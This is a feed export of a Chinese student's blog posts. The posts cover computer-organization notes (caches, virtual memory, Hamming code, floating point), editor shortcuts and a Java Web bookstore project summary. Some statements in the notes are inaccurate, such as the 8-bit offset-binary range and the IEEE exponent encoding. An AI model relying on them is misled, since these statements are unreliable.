命中则加一，找出命中次数最少的，将其替换，如果有多个最小，则参看操作系统相关内容。</p><h3 id="Cache-内存数据同步"><a href="#Cache-内存数据同步" class="headerlink" title="Cache 内存数据同步"></a>Cache 内存数据同步</h3><p>当 CPU 需要修改内存中的数据，那么 Cache 和 内存 之间的数据如何同步呢，下面是几种方法。</p><p><strong>写回法 Write-Back</strong>：Cache 被命中：CPU 修改 Cache 内的数据之后，暂不做处理，当整行 Cache Line 被替换之后，再将里面被修改的数据更新到内存中。</p><p><strong>全写法 Write-Through</strong>：Cache 被命中：CPU 修改 Cache 内的数据之后，将被修改的数据加入到写缓冲区中，缓冲区慢慢的去内存中更新数据。</p><p><strong>写分配法 Write-Allocate</strong>：Cache 无数据：将内存数据调入 Cache 中，在 Cache 中修改数据。</p><p><strong>非写分配法 No-Write-Allocate</strong>：Cache 无数据：直接在内存中修改数据，不调入 Cache 中。</p><p>一般来说，会让写回法和写分配法结合，大大减少了内存的读写，但是两者数据之间往往不同。</p><p>剩下的就是全写法和写分配法结合，借助写缓冲区 Write Buffer，提升两者数据的同步率，但是会对内存进行频繁的读写。</p><hr><p>重点来了，现代 CPU 当然是会考虑到它们之间的各自优劣性，所以就将这两种组合了起来，第二种结合方法作为 L1 Cache 和 L2 Cache 数据同步的方法，第一种结合方法作为 L2 Cache 和内存之间的数据同步方法。</p><p>这样更快的 L1 和 L2 能快速的完成数据修改</p><h2 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h2><p>首先遇事不决，先看一篇非常棒的文章：<a href="https://xorex.space/2021/05/12/d1cccaf324ae/">深入虚拟内存</a></p><p>因为一般来说我们用户运行的程序，调用的程序/数据的位置都是在硬盘中的，能够得到的指令/数据地址也都是硬盘中的地址（我们称为虚拟地址）。而和 CPU 进行数据交换的，一般都是在内存中。所以我们需要将用到的指令和数据根据 IO 总线读取到内存中，CPU 去调用这些指令和数据是，因为只知道它在硬盘中的地址，不知道被读取到内存的那个位置了，因此我们在将硬盘的东西写入内存中的时候，就需要建立一个映射表，供 CPU 映射查找数据在内存中的真实地址。</p><p>里面具体的内容有很多，具体看上面的文章吧，写的非常好，本质上主存也是对硬盘的一个缓存优化，内存中存储程序最近运行会用到的数据，用页表来管理缓存映射，如果 CPU 命中就调用内存数据，没有命中就将硬盘数据调入内存中，CPU 再次去页表找映射最终命中。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;主存的简单模型&quot;&gt;&lt;a href=&quot;#主存的简单模型&quot; class=&quot;headerlink&quot; title=&quot;主存的简单模型&quot;&gt;&lt;/a&gt;主存的简单模型&lt;/h2&gt;&lt;p&gt;首先看一个主存储器的模型图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://xorex.spac</summary>
      
    
    
    
    <category term="计算机体系" scheme="https://xorex.space/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
    
    <category term="计算机组成原理" scheme="https://xorex.space/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计组-数据的表示和运算</title>
    <link href="https://xorex.space/2021/05/06/a39242fd7884/"/>
    <id>https://xorex.space/2021/05/06/a39242fd7884/</id>
    <published>2021-05-06T07:39:00.000Z</published>
    <updated>2021-05-08T09:06:39.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据的检验"><a href="#数据的检验" class="headerlink" title="数据的检验"></a>数据的检验</h2><h3 id="BCD-码"><a href="#BCD-码" class="headerlink" title="BCD 码"></a>BCD 码</h3><p>BCD 码用 4 位二进制数来表示 1 位十进制数中的 0~9 这 10 个数码，对于浮点数来说，BCD 码的最大作作用就是能和十进制完美对接，不会产生 <strong>精度损失</strong> ，因为其他二进制编码表示浮点小数的时候，为离散的，像 0.3 这样的数浮点数就无法表示。但是 BCD 码因为四位表示十进制的一位，所以就没有这个问题。</p><h3 id="奇偶校验码"><a href="#奇偶校验码" class="headerlink" title="奇偶校验码"></a>奇偶校验码</h3><p>奇校验码规定校验码的 1 有奇数个，也就是所有位（有效信息位+校验位）进行异或运算得到结果为 1</p><p>偶校验码规定校验码的 1 有偶数个，也就是所有位（有效信息位+校验位）进行异或运算得到结果为 0</p><p>这种校验码只能检测有奇数位发生错误的情况，不具备纠错能力。</p><h3 id="海明码"><a href="#海明码" class="headerlink" title="海明码"></a>海明码</h3><p>海明码具有两位检错，一位纠错的能力。</p><p>首先设需要验证的位数为 n，需要 k 位作为校验位，根据公式：<code>n+k&lt;=2^k-1</code> 计算出来所需要的额外验证位 k。</p><p>这些验证位在验证码的位置是按照二进制位权决定的，比如当 k 等于 3 的时候，在二进制里面就可以表示 1 2 4 这三个位权，那么就把所需要的 3 个验证位放在验证码的第 1 2 4 位上面。这是因为海明码的纠错是依靠判断验证位正确性然后将位权累加得到错误的地方，将验证位放到自己对应的位权的位置的话，一旦验证位错误也能获取错误的地方。这篇文章讲的很好：<a href="https://www.huaweicloud.com/articles/e21f939952893bdebef76eeab885c424.html">带你从头思考海明码的创造过程</a></p><p>验证位的计算也是根据分组决定的，分组的原因就是将某一个数据位的对错和几位位验证位绑定为一组，从而获取多组绑定结果。而分组的根据就是数据位在验证码的位权的二进制表示，比如一个数据位的位权是 5 也就是在验证码的地 5 位，那么 5 的二进制表示就是 101 对应分组就绑定到了 1 4 位上面的验证位上面了（想想为什么我们将验证位放到 2^n 上面），这样一旦 1 4 位的验证位验证失败，就可以一定确定是第 5 位出了错，因为只有第五位出错才会导致 1 4 位验证位同时验证失败。</p><p>这样我们就可以根据数据的二进制表示来分组了，分完组就可以计算验证位的值了，一般来说海明码这里采用偶验证，将某验证位加上他能表示的所有数据位一起进行偶验证得到 0，从而反计算得到此验证位的值。海明码验证的过程也是此过程，将所有的验证位按照上面的方式进行偶验证，结果正确表示 0，错误表示 1。</p><p>获取每一位验证位验证的结果之后，按照验证位位权将其求得十进制结果，得到错误数据位的标号。能得到原因就是因为分组，1 4 位验证位验证失败，一定是同时分到 1 4 位验证为组的数据位错误了，才能同时导致两个验证位失败，而同时分到 1 4 位的是第 4+1=5 位。</p><p>下面的图也可以参考验证位的分组。</p><p><img src="https://xorex.space/image/223.jpg" alt="223.jpg"></p><h2 id="数据的表示"><a href="#数据的表示" class="headerlink" title="数据的表示"></a>数据的表示</h2><h3 id="定点小数和整数"><a href="#定点小数和整数" class="headerlink" title="定点小数和整数"></a>定点小数和整数</h3><p>定点数一般来说不怎么用到，虽然精度较高，但是表示的位数太低。</p><p>定点小数是一个纯小数，第一位为符号位，后面全都是小数点后面的位数，权值为 <code>1-2^(-n)</code></p><p>定点整数是一个纯整数，第一位为符号位，后面全都是小数点前面的位数，权值为 <code>2^n</code></p><h3 id="移码"><a href="#移码" class="headerlink" title="移码"></a>移码</h3><p>移码的作用主要是为了表示浮点数的阶码（也就是科学计数法乘上去的 2^n）。</p><p>那么作为根据它的用途，就需要满足以下特性：快速比对大小。（涉及到浮点数的计算必须比大小）</p><p>因此移码就是将 <strong>真值</strong> 向右偏移，使得负数变成正数。注意这里的移码是没有符号位的，通过加一个数将真值向右偏移，所有的数都是正数，可以快速比大小。</p><p>用 8bit 举例，经过偏移之后，00000000 表示原有的最小值 -2^8，11111111 表示原有的最大值 2^8-1。</p><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p>对于位移运算来说，正数的原码、补码、反码、以及负数的原码，在进行位运算位移的时候，都是补零。</p><p>唯一的不一样的是，负数的补码，在向左移的时候添 0 效果等价于乘 2，向右移的时候补 1 效果等价于除 2 。这里可以想想补码原理相关。</p><h3 id="定点数的乘法运算"><a href="#定点数的乘法运算" class="headerlink" title="定点数的乘法运算"></a>定点数的乘法运算</h3><p>定点数的原码乘法运算和我们手算乘法是一模一样的，不同的是，它全程只有占用三个寄存器，通用寄存器，ACC 寄存器，MQ 寄存器。其中通用寄存器和 MQ 寄存器初始存储乘数，而 ACC 寄存器最后和 MQ 寄存器一起存储乘积结果。运算原理如下图：</p><p><img src="https://xorex.space/image/224.jpg" alt="224.jpg"></p><p>它通过检测 MQ 的最末尾值，如果为 1，那么在 ACC 中加上通用寄存器中的被乘数，为零则什么都不做，然后将 ACC 和 MQ 的内容一起左移一位。重复上面的步骤 MQ 的长度次数。最后 ACC 寄存器最后和 MQ 寄存器一起存储乘积结果。而符号位则直接采用两个乘数符号位的异或运算结果。</p><p>对于原码的乘法运算来说，还是很简单的，但是计算机里面的定点数为了方便减法的运算，一般都是用补码来存储，所以这里要么直接转化成原码，要么直接使用补码的乘法器。</p><hr><p>这里的补码的乘法，有亿点点复杂，想了很久也没有想明白，只在知乎上找到了一个写的很好的文章，解释了 Booth 算法为什么要 Yn+1 - Yn 来决定是加还是减，用到了一点高中数列的知识。但是前面的很多推导他都省略了，结果导致根本看不懂。</p><p>下面是计算过程：</p><p><img src="https://xorex.space/image/225.jpg" alt="225.jpg"></p><p>哭了，别说直观理解了，连推导过程都不给啊……</p><p>学个计组也太难了吧……</p><h3 id="C-语言类型转化"><a href="#C-语言类型转化" class="headerlink" title="C 语言类型转化"></a>C 语言类型转化</h3><p>里面的整形都使用的补码表示，long -&gt; int -&gt; short 都是直接截断后面的部分作为下一个类型的数据的，会直接丢失高位。</p><p>对于 double -&gt; float 的尾数是丢失小数点最后几位的精度，而阶码则是截断后面部分舍去前面部分的。</p><h3 id="IEEE-规范"><a href="#IEEE-规范" class="headerlink" title="IEEE 规范"></a>IEEE 规范</h3><p>浮点数在计算机中的表示方式为：</p><p><img src="https://xorex.space/image/226.jpg" alt="226.jpg"></p><p>其中符号位 S 为一位，0 表示正，1 表示负，而指数位（阶码） E 使用移码来表示，偏移量为 <code>2^n-1</code>。数值位 M 使用原码，表示小数的尾数。</p><p>对于阶码，这里是根据补码进行加偏移量的，因为偏移量为 <code>2^n-1</code> 所以会导致表示范围为 <code>-1</code> 到 <code>2*2^n -2</code>，也就是说，阶码的实际表示范围为 <code>1</code> 到 <code>2*2^n -2</code>。</p><table><thead><tr><th>阶码 E 值</th><th>尾码 M 值</th><th>表示内容</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>浮点数为 0</td></tr><tr><td>0</td><td>≠0</td><td>表示为非规格化数尾数，没有默认的第一位 0.1</td></tr><tr><td>-1</td><td>0</td><td>表示为无穷大</td></tr><tr><td>-1</td><td>≠0</td><td>表示为 NaN，非数值</td></tr></tbody></table><p>而尾数最终是需要被规格化的，规格化是指：将尾数部分化为 0.1XXXX 的形式，这样第一位的默认 1 就可以省略了。当然规格化的时候需要将阶码进行加减运算。</p><h3 id="ALU-运算"><a href="#ALU-运算" class="headerlink" title="ALU 运算"></a>ALU 运算</h3><p>对于加法的电路设计来说，因为需要获取上一位的进位信息，所以需要串行计算，总的延时有点高。那么为了降低延时，可以通过数学逻辑进行并行计算（某种意义上的真正的多线程），也就是每一位的获取的计算都是独立的。</p><p>首先构造一个并行的四位加法器，然后将四个四位加法器串行，得到一个较快的十六位加法器。（直接搞一个十六位并行的加法器电路设计过于复杂，所以还是四个拼接好了）</p><p><img src="https://xorex.space/image/227.jpg" alt="227.jpg"></p><p>这里面的并行计算的数学推导有点复杂啊，不学了……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数据的检验&quot;&gt;&lt;a href=&quot;#数据的检验&quot; class=&quot;headerlink&quot; title=&quot;数据的检验&quot;&gt;&lt;/a&gt;数据的检验&lt;/h2&gt;&lt;h3 id=&quot;BCD-码&quot;&gt;&lt;a href=&quot;#BCD-码&quot; class=&quot;headerlink&quot; title=&quot;BCD</summary>
      
    
    
    
    <category term="计算机体系" scheme="https://xorex.space/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
    
    <category term="计算机组成原理" scheme="https://xorex.space/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计组-计算机基本结构/工作流程</title>
    <link href="https://xorex.space/2021/04/29/138ad4d24eb9/"/>
    <id>https://xorex.space/2021/04/29/138ad4d24eb9/</id>
    <published>2021-04-29T12:32:50.000Z</published>
    <updated>2021-05-08T16:53:18.680Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>已经很久没有写过博客了，发现这样的效果真的是不太好，所以觉得还是继续保持经长写博客的习惯吧，为了缓解记忆枯燥的 Spring API，我决定并发学习计算机组成原理（视频当电视剧看）</p></blockquote><h2 id="计算机基本结构-计算流程"><a href="#计算机基本结构-计算流程" class="headerlink" title="计算机基本结构/计算流程"></a>计算机基本结构/计算流程</h2><iframe src="https://www.xmind.net/embed/x3pUA5" width="800px" height="540px" frameborder="0" scrolling="no"></iframe><p><img src="https://xorex.space/image/222.jpg" alt="222.jpg"></p><p>需要注意几点：</p><ol><li><p>上面计算流程中，CPU 区分从存储器中取出来的是指令还是数据的方法是根据指令执行周期，一个指令从 PC 中取出地址到完全执行完毕为一整个指令执行周期，其中周期的都会有取指令阶段和执行阶段。CPU 通过区分从存储器中获取内容是在取指令阶段还是执行阶段来判断取出来的是指令还是数据。</p></li><li><p>在计算机中，<code>透明</code> 的概念是等价与黑盒的，即无法对外显示。据此，寄存器对汇编语言是非透明的，汇编语言可以直接操作寄存器。</p></li></ol><h2 id="计算机性能指标"><a href="#计算机性能指标" class="headerlink" title="计算机性能指标"></a>计算机性能指标</h2><iframe src="https://www.xmind.net/embed/3E9LQy" width="800px" height="540px" frameborder="0" scrolling="no"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;已经很久没有写过博客了，发现这样的效果真的是不太好，所以觉得还是继续保持经长写博客的习惯吧，为了缓解记忆枯燥的 S</summary>
      
    
    
    
    <category term="计算机体系" scheme="https://xorex.space/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
    
    <category term="计算机组成原理" scheme="https://xorex.space/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>快捷键整合</title>
    <link href="https://xorex.space/2021/04/20/20ca0302e5c5/"/>
    <id>https://xorex.space/2021/04/20/20ca0302e5c5/</id>
    <published>2021-04-20T09:37:01.000Z</published>
    <updated>2021-05-11T12:41:04.417Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows-快捷键"><a href="#Windows-快捷键" class="headerlink" title="Windows 快捷键"></a>Windows 快捷键</h2><p><code>Ctrl + Shift + N</code> 创建新文件夹</p><p><code>Ctrl + D</code> 删除文件</p><p><code>Win + E</code> 打开文件管理器</p><p><code>Ctrl + 拖拽</code> 创建文件副本</p><p><code>Ctrl + N</code> 新建同级界面（常用于文件管理器）</p><p><code>Alt + 双击</code> 查看文件属性</p><p><code>Win + X + U + S</code> 快速睡眠</p><p><code>Win + D</code> 显示桌面</p><p><code>Win + L</code> 锁屏</p><h2 id="IDEA-快捷键"><a href="#IDEA-快捷键" class="headerlink" title="IDEA 快捷键"></a>IDEA 快捷键</h2><h3 id="视野移动"><a href="#视野移动" class="headerlink" title="视野移动"></a>视野移动</h3><p><code>Ctrl + +</code> 展开当前折叠的代码块</p><p><code>Ctrl + Shift + +</code> 展开所有折叠的代码块</p><p><code>Ctrl + -</code> 折叠当前展开的代码块</p><p><code>Ctrl + Shift + -</code> 折叠所有展开的代码块</p><p><code>Ctrl + ↑/↓</code> 向上/下滚轮</p><p><code>Alt + ↑/↓</code> 光标移动到上/下一个方法中</p><p><code>Shift + 滚轮</code> 横向滚动滚轴</p><h3 id="文本编辑"><a href="#文本编辑" class="headerlink" title="文本编辑"></a>文本编辑</h3><p><code>Ctrl + R</code> 当前文件进行文本替换 Replace</p><p><code>Ctrl + Shift + F</code> 全局搜索</p><p><code>Ctrl + Shift + R</code> 全局替换</p><p><code>Ctrl + Shift + U</code> 选中内容进行大小写替换</p><p><code>Ctrl + W</code> 递进选择光标处代码</p><p><code>Ctrl + Y</code> 删除当前行</p><p><code>Ctrl + D</code> 复制当前行</p><p><code>Ctrl + /</code> 将选中的部分标记为单行注释</p><p><code>Ctrl + Shift + /</code> 将选中的部分标记为多行注释</p><p><code>Ctrl + Backspace</code> 删除光标前的一串英文单词</p><p><code>Ctrl + Alt + L</code> 格式化代码</p><p><code>Ctrl + Alt + O</code> 整理导入的包</p><p><code>Ctrl + Alt + T</code> 对选中代码进行语句包裹（if try..）</p><p><code>Shift + Enter</code> 创建空行</p><p><code>Shift + Tab</code> 取消缩进</p><p><code>Alt + Shift + ↑/↓</code> 带着光标所在行上下移动</p><h3 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h3><p><code>Ctrl + O</code> 选择可以重写的方法</p><p><code>Ctrl + I</code> 选择可以实现的方法</p><p><code>Ctrl + ,</code> 普通代码提示</p><p><code>Ctrl + J</code> 提示插入固定语句模板</p><p><code>Ctrl + P</code> 提示方法的参数列表</p><hr><p>后缀补全：表达式后面加 <code>.</code> 之后，选择对应的补全。比如 <code>sout</code> <code>if</code> <code>try</code> 等。</p><p>语句补全：直接输入语句模板的关键词，然后选择即可，如输入 <code>itar</code> 并回车自动生成迭代数组的 for 语句。如果想不起来语句模板的关键词，可以用 <code>Ctrl +J</code> 来进行提示。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><code>Ctrl + E</code> 显示最近打开过的文件</p><p><code>Ctrl + 左键单击</code> 弹出文件所在位置的文件管理器</p><p><code>Shift + Esc</code> 隐藏最后激活的窗口（如输出栏）</p><p><code>Alt + S</code> 打开设置</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows-快捷键&quot;&gt;&lt;a href=&quot;#Windows-快捷键&quot; class=&quot;headerlink&quot; title=&quot;Windows 快捷键&quot;&gt;&lt;/a&gt;Windows 快捷键&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Ctrl + Shift + N&lt;/code&gt; 创建新文</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="快捷键" scheme="https://xorex.space/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>BookStore 项目记录</title>
    <link href="https://xorex.space/2021/04/15/fc2cd7d811c5/"/>
    <id>https://xorex.space/2021/04/15/fc2cd7d811c5/</id>
    <published>2021-04-15T13:22:29.000Z</published>
    <updated>2021-05-06T07:47:06.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我跟着视频做了一个小小的-Java-Web-项目这件事"><a href="#关于我跟着视频做了一个小小的-Java-Web-项目这件事" class="headerlink" title="关于我跟着视频做了一个小小的 Java Web 项目这件事"></a>关于我跟着视频做了一个小小的 Java Web 项目这件事</h2><blockquote><p>其实这个项目已经很久之前就做好了，但是由于各种的拖延症，导致了现在才开始总结，不过应该没有遗忘太多，所以还好。</p></blockquote><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>大概的结构：</p><p><img src="https://xorex.space/image/216.jpg" alt="项目结构"></p><p>项目的思路就是 MVC 分层，分为 Model View Controller 三层，然后分别完成对应的任务。</p><h3 id="DAO-层"><a href="#DAO-层" class="headerlink" title="DAO 层"></a>DAO 层</h3><p>持久化层比较让我记忆深刻的就是使用了 JDBCUtils BaseDao DetialsDao 三层来实现代码复用和解耦。</p><p><img src="https://xorex.space/image/217.jpg" alt="DAO"></p><ol><li>首先使用 JDBCUtils 工具类来负责数据库连接池的创建和管理，用于外界控制获取数据库连接和事务的实现，专注于和数据库的直接联系：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DruidDataSource source;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        source=getDruidDataSource() <span class="comment">//创建阿里的 Druid 连接池</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span></span>; <span class="comment">//管理数据库连接的获取</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">commitAndClose</span><span class="params">()</span></span>; <span class="comment">//事务的提交</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rollBackAndClose</span><span class="params">()</span></span>; <span class="comment">//事务的回滚</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>然后使用了 BaseDao 对最基本的数据库交互做了封装，这里基本交互是指根据 SQL 查寻的返回值类型抽象出来一类查询，并使用了 DBUtils 来作为 SQL 查询结果和 Java Bean 数据封装之间转换的桥梁。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(String SQL,Object ... args)</span></span>; <span class="comment">//返回类型为影响行数 int 的更新交互</span></span><br><span class="line">    <span class="keyword">protected</span>  &lt;T&gt; <span class="function">T <span class="title">queryForOne</span><span class="params">(Class&lt;T&gt; type,String SQL,Object ... args)</span></span>; <span class="comment">//返回类型为单个类实例的查询交互</span></span><br><span class="line">    <span class="keyword">protected</span>  &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">queryForList</span><span class="params">(Class&lt;T&gt; type, String SQL, Object ... args)</span></span>; <span class="comment">//返回类型为多个类实例的查询交互</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">queryForSingleValue</span><span class="params">(String SQL,Object ... args)</span></span>; <span class="comment">//返回类型为单个基本数据类型的查询交互</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>最后就是我们业务需要的针对于具体表的 SQL 执行的 DAO 了，只需要继承于 BaseDao 来复用基本数据库交互代码，自己只需要专注于构造具体业务的 SQL 语句即可，执行交给前两层。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Book <span class="title">queryBookByID</span><span class="params">(Integer id)</span> </span>&#123; <span class="comment">//具体的业务所需 DAO</span></span><br><span class="line">    String SQL=<span class="string">&quot;select * from Books where id=?;&quot;</span>; <span class="comment">//专注于 SQL 语句构造</span></span><br><span class="line">    <span class="keyword">return</span> queryForOne(Book.class, SQL, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Book&gt; <span class="title">queryAllBooks</span><span class="params">()</span> </span>&#123; <span class="comment">//具体的业务所需 DAO</span></span><br><span class="line">    String SQL=<span class="string">&quot;select * from Books;&quot;</span>; <span class="comment">//专注于 SQL 语句构造</span></span><br><span class="line">    <span class="keyword">return</span> queryForList(Book.class, SQL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Service-层"><a href="#Service-层" class="headerlink" title="Service 层"></a>Service 层</h3><p>Service 层，主要任务就是通过调用 DAO 层，来实现项目的一个个最小单位的服务，用于提供给 Servlet 层组合调用，完成一个 Web 请求的执行。比如下面的都是关于订单的最小单位的服务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">createOrder</span><span class="params">(Cart cart,Integer userId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">showAllOrders</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendOrder</span><span class="params">(String orderId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">receiveOrder</span><span class="params">(String orderId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Order <span class="title">showOrderDetials</span><span class="params">(String orderId)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">showUserOrders</span><span class="params">(Integer userId)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xorex.space/image/218.jpg" alt="Service"></p><h3 id="Servlet-层"><a href="#Servlet-层" class="headerlink" title="Servlet 层"></a>Servlet 层</h3><p>Servlet 层主要是对用户发起的 Web 请求进行处理，通过组合调用 Service 层来实现这个请求。这里最亮眼的就是使用了反射来管理大量的请求。</p><p>首先创建一个 BaseServlet 来管理的 post get 请求，然后外部在发起请求的时候，带上需要处理请求的 Servlet 程序的名字。请求发送到 BaseServlet 之后，就会根据带来的 Servlet 程序名称通过反射调用对应的 Servlet 的方法，来完成请求处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    Method method=<span class="keyword">this</span>.getClass().getDeclaredMethod(req.getParameter(<span class="string">&quot;service&quot;</span>), HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line">    method.invoke(<span class="keyword">this</span>,req,resp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后其他的所有的 Servlet 类继承这个 BaseServlet，就能通过反射被调用自己的业务方法了。因为被继承之后，反射代码是在每一个子类里面执行的，所以也不需要担心方法名和其他 Servlet 程序重名的问题。</p><p><img src="https://xorex.space/image/219.jpg" alt="Servlet"></p><h3 id="POJO-目录"><a href="#POJO-目录" class="headerlink" title="POJO 目录"></a>POJO 目录</h3><p>这里先来讨论以下关于 POJO 和 Java Bean 的关系。</p><p>POJO <code>Plain Ordinary Java Object</code> 指的是简单普通的 Java 对象，只有<strong>纯粹</strong>的 setter/getter 方法的类被称为 POJO。这里的存粹就是只能有这两种方法，POJO 一般作为数据的载体。</p><p>Java Bean 则具有严格的规范，</p><ol><li><p>所有的实例变量都应该是 private 类型（封装原则）</p></li><li><p>需要提供 public 修饰的无参构造方法（为了创建实例）</p></li><li><p>为 private 修饰的字段提供 setter/getter （为了获取和设置字段的值）</p></li></ol><p>当然只需要满足上面三点即可，意味着 Java Bean 里面可以有除了 setter/getter 以外的方法（toString、hashCode 等），也可以实现各种接口（Serializable 等）</p><p>这里总结一下就是这两个东西很相近，但是又不兼容，POJO 专注于数据的简单存取，而 Java Bean 不仅仅能数据存取，还能进行简单的数据处理。</p><p>所以在项目里面这个层的作用就是作为数据的存储容器。</p><p><img src="https://xorex.space/image/220.jpg" alt="POJO"></p><h3 id="Utils-目录"><a href="#Utils-目录" class="headerlink" title="Utils 目录"></a>Utils 目录</h3><p>里面主要是常用的代码封装出来的两个工具，一个是关于 JDCB 代码封装的 JDBCUtils，另外一个是将请求字符串数据转化为其他类型的 WebUtils 。</p><p><img src="https://xorex.space/image/221.jpg" alt="Utils"></p><h2 id="项目感受"><a href="#项目感受" class="headerlink" title="项目感受"></a>项目感受</h2><blockquote><p>其实这个可以说是我写代码以来第一个真正意义上的项目了（Python 那个小游戏算半抄半写的，基本上没学到啥东西），写这个更多意义上是想要做一个总结，当然可能是因为里面很多东西在做项目的时候都已经想明白了，所以这个总结也没多大的学习方面的作用。但是还是觉得想要把它认真的记录下来，留作纪念吧。</p></blockquote><p>项目地址：<code>https://github.com/Administrator-Xorex/BookStore.git</code></p>]]></content>
    
    
      
      
